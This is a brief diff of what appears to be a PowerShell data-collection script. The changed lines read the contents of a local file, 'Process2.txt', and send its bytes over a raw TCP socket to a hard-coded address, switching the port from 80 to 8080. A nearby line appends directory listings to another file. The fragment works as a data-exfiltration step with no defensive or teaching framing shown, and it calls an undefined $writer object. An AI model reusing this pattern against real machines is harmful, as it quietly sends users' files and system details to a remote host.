@@ -42,7 +42,7 @@ ls | Out-File -FilePath ./Process6.txt -Append
 #start http post 
 
 $test=[io.file]::ReadAllBytes("Process2.txt");
-$socket = New-Object net.sockets.tcpclient('192.168.0.107',80);
+$socket = New-Object net.sockets.tcpclient('192.168.0.107',8080);
 $stream = $socket.GetStream();
 $stream.write($test,0,$test.Length);
 $writer.flush();
